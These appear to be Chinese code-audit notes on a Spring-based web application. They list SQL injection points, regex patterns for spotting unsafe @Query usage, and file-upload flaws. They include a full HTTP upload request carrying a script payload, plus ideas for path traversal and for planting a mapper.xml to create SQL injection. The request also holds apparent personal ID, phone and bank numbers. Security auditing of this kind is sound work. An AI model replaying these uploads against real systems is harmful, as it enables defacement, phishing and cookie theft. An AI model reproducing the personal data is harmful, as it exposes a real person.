## 黑盒测试

## 白盒测试

### 审计SPLE表达式

* 搜索`#{""}`没有找到相关用法
* 搜索`ExpressionParser` `SpelExpressionParser` 没有找到相关类 
* 版本非漏洞版本

### 审计SQL注入

* address-mapper.xml id="allDirector" 布尔注入 延时注入
* notice-mapper.xml id="sortMyNotice" 布尔 延时

#### @Query不进行预处理`:#{#sortId} `

```java
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.data.repository.CrudRepository;
import org.springframework.stereotype.Repository;

@Repository
public interface MenuRepository extends CrudRepository<SystemMenu, Long> {
    
    @Query("update SystemMenu menu set menu.sortId = :#{#sortId} where menu.parentId = :parentId and menu.sortId = (:sortId - :arithNum)")
    int changeSortId(@Param("sortId") String sortId, @Param("arithNum") Integer arithNum, @Param("parentId") Long parentId);
}
```

* 暂无注入点

#### @Query不进行预处理@Query(nativeQuery = true

```java
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.data.repository.CrudRepository;
import org.springframework.stereotype.Repository;

@Repository
public interface UserRepository extends CrudRepository<User, Long> {

    @Query(nativeQuery = true, value = "SELECT * FROM user WHERE username = :username")
    User findByUsername(@Param("username") String username);
}

```

* 暂无

#### @Query不进行预处理参数值为字段名(这种写发放是否存在有疑问)

```java
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.data.repository.CrudRepository;
import org.springframework.stereotype.Repository;

@Repository
public interface UserRepository extends CrudRepository<User, Long> {

    @Query("SELECT u FROM User u WHERE u.:fieldName = :fieldValue")
    User findByField(@Param("fieldName") String fieldName, @Param("fieldValue") String fieldValue);
}

```

* `@Query\(.*?order by\s+[^a-z]`
* `@Query\(.*?[:?]\w*[)'"]*=`
* `@Query\(.*?[\s('"]in[\s('"]`
* `@Query\(.*?[\s('"]like[\s('"]`

#### 动态拼接sql语句

```java
import org.springframework.data.jpa.repository.Query;
import org.springframework.data.repository.query.Param;
import org.springframework.data.repository.CrudRepository;
import org.springframework.stereotype.Repository;

@Repository
public interface UserRepository extends CrudRepository<User, Long> {

    @Query("SELECT u FROM User u WHERE u.username = :username" + 
           " AND u.role = '" + Role.ADMIN + "'")
    List<User> findAdminUsers(@Param("username") String username);
}
```

* 暂无

### 审计错误的异常抛出

#### e.printStackTrace

* 排查后,发现异常在控制台输出而非前端页面,这个可能和配置有关,需要后续研究总结

### 任意文件上传

#### 用户头像处文件上传

* 限制：上传路径不可控、文件名不可控
* 利用：文件类型可控，可获取文件在web服务器上的相对路径，可以访问，可以上传html实现挂黑页、钓鱼、打cookie等操作，低危

* 报文：

```http
POST /saveuser HTTP/1.1
Host: 192.168.110.147
Content-Length: 1879
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://192.168.110.147
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMCI8ln7TqBmoMCRQ
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.110.147/userpanel
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: JSESSIONID=F5C48FB26323C735A6DF743CFA9E0B95
Connection: close

------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="userName"

admin
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="userTel"

13272143450
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="realName"

lyh-god神
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="eamil"

923219711@qq.com
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="address"

湖南工业大学
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="userEdu"

本科
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="school"

湖南工业大学
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="idCard"

510322198602030429
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="bank"

62175555555555444
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="sex"

男
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="themeSkin"

blue
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="birth"

1986-02-03
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="userSign"

好好
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="password1"


------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="password"


------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="filePath"; filename="xss.js"
Content-Type: text/javascript

<script>alert('xss')</script>
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ
Content-Disposition: form-data; name="ctl00$cphMain$btnSave"

保存
------WebKitFormBoundaryMCI8ln7TqBmoMCRQ--

```

* 代码：UserpanelController.java @RequestMapping("saveuser")...String imgpath=nservice.upload(filePath)...  NotepaperService.upload

#### 文件管理处配合畸形用户名实现任意文件上传+目录穿越

* 限制：需要畸形用户名，文件名不可控

* 利用分析：在可以任意更改用户名的情况下

  * 通过达到数据库长度限制造成截取，完成任意文件读取、删除，再借助复制、剪切功能实现任意文件覆盖、写入    无法实现覆盖、写入操作，因为没有实际移动文件（仅在数据库中修改了path id）；数据库截取失败
  * 直接上传可以利用的点
    * 上传html  暂未发现可以在前端页面找到上传文件的文件名
    * 上传mapper.xml。这里不可行，但是是一个思路，如果开启自动扫描mapper.xml，且对应的接口中有方法不是在mapper.xml中实现的，可以通过再上传.xml文件进行sql语句的注册或覆盖，创造一个sql注入漏洞出来（但是这又涉及到项目在什么时候会扫描mapper.xml的情况）
    * 上传mybatis配置文件    不可行，要么采取默认名，要么在代码中指定名，但是都做不到


### 模板注入

* 项目使用的模板是freemarker，无法传参攻击，之只能通过上传自定义模板进行攻击，而该系统无相关功能

### ssrf

